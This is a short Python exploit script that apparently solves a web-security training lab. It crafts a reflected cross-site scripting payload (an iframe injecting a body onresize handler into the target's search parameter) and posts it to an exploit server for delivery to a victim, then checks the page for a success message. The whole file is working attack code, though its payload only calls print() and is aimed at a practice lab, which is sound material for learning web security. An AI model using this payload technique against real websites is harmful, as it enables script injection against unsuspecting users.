import requests
import urllib3
from sys import argv
from time import sleep

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_urls():
    if len(argv) != 3:
        print(f"[+] usage {argv[0]} <url> <exploit server url>")
        print(f"[+] example {argv[0]} 'http://example.com' 'http://exploit.server.com'")
        exit(-1)
    
    if argv[1][-1] == '/':
        url = argv[1][:-1]
    else:
        url = argv[1]

    if argv[2][-1] == '/':
        exlpoit_server = argv[2][:-1]
    else:
        exlpoit_server = argv[2]

    return url, exlpoit_server


def attack():
	url,exlpoit_server = get_website_urls()
	print("[+] Starting attack")
	xss_payload = f"<iframe src='{url}/?search=<body+onresize%3dprint()>' onload=this.style.width='20px'></iframe>"
	params = {
		"urlIsHttps":"on",
		"responseFile":"/exploit",
		"responseHead":"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
		"responseBody":xss_payload,
		"formAction":"DELIVER_TO_VICTIM"
	}
	print(f"[+] sending xss payload : {xss_payload}")
	r = requests.post(exlpoit_server, data=params)

	r = requests.get(url)
	if 'Congratulations' in r.text:
		print("[+] attack successfully")
	else:
		print("[-] Attack un successfully")

attack()